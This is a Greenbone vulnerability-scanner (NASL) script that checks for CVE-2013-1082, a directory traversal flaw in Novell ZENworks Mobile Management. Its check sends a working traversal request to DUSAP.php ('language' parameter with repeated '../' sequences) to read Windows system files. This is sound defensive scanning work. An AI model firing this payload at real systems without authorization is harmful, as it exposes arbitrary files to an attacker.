# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:novell:zenworks_mobile_management";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803811");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2013-1082");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-06-14 11:06:05 +0530 (Fri, 14 Jun 2013)");
  script_name("Novell ZENworks Mobile Management Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/52545");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60179");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1028265");
  script_xref(name:"URL", value:"http://www.novell.com/support/kb/doc.php?id=7011896");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_novell_zenworks_mobile_management_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("zenworks_mobile_management/installed", "Host/runs_windows");
  script_require_ports("Services/www", 80);
  script_tag(name:"impact", value:"Successful exploitation will let the attackers to disclose the contents
  of any file on the system via directory traversal sequences.");
  script_tag(name:"affected", value:"Novell ZENworks Mobile Management version before 2.7.1");
  script_tag(name:"insight", value:"Input passed via the 'language' parameter to DUSAP.php is not properly
  verified before being used to include files.");
  script_tag(name:"solution", value:"Upgrade to version 2.7.1 or later.");
  script_tag(name:"summary", value:"Novell ZENworks Mobile Management is prone to a directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files("windows");

foreach file (keys(files)) {
  url = "/DUSAP.php?language=res/languages/" + crap(data:"../", length:6 * 9) + files[file];
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
